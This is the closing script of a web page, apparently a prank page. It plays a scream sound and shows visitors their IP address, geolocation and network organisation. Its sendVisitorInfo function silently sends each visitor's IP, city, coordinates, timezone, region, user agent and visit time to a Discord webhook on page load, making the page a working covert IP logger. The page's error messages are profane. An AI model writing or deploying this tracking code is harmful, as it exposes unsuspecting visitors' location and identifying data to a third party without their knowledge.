                fetchLocalAddress();
                sendVisitorInfo();
            }, 1000);
        };

        function playSound() {
            const audio = document.getElementById("scream");
            audio.play().catch(() => {});
        }

        // إحضار IP من ipify
        async function fetchIPAddress() {
            try {
                let response = await fetch('https://api.ipify.org?format=json');
                let data = await response.json();
                document.getElementById('ip-address').textContent = `Your IP: ${data.ip}`;
            } catch {
                document.getElementById('ip-address').textContent = 'Fuck You';
            }
        }

        // إحضار بيانات الموقع من ipinfo
        async function fetchLocalAddress() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ip = (await ipResponse.json()).ip;

                const ipInfo = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await ipInfo.json();
                const now = new Date().toLocaleString();

                document.getElementById('local-address').textContent = `Your Local: ${data.loc}`;
                document.getElementById('city-address').textContent = `Your City: ${data.city}`;
                document.getElementById('Country-address').textContent = `Your Country: ${data.country}`;
                document.getElementById('org-address').textContent = `Your Org: ${data.org}`;
                document.getElementById('dateTime-address').textContent = `Date Time: ${now}`;
            } catch {
                document.getElementById('local-address').textContent = 'Fuck You';
                document.getElementById('city-address').textContent = 'Fuck You';
            }
        }

        // إرسال البيانات إلى Discord Webhook
        async function sendVisitorInfo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ip = (await ipRes.json()).ip;
                const infoRes = await fetch(`https://ipinfo.io/${ip}/json`);
                const info = await infoRes.json();
                const userAgent = navigator.userAgent;
                const dateTime = new Date().toLocaleString();

                await fetch(discord_Webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "**Config IP : [ https://ipinfo.org ]**",
                        embeds: [{
                            title: "Visitor Details",
                            fields: [
                                { name: "IP Address", value: ip, inline: true },
                                { name: "Country", value: info.country, inline: true },
                                { name: "City", value: info.city || "Unknown", inline: true },
                                { name: "org", value: info.org || "Unknown", inline: true },
                                { name: "loc", value: info.loc || "Unknown", inline: true },
                                { name: "timezone", value: info.timezone || "Unknown", inline: true },
                                { name: "Region", value: info.region || "Unknown", inline: true },
                                { name: "User Agent", value: userAgent, inline: false },
                                { name: "Date & Time", value: dateTime, inline: false }
                            ],
                            color: 3066993
                        }]
                    })
                });
            } catch (e) {
                console.error('Webhook error:', e);
            }
        }
    </script>
</body>
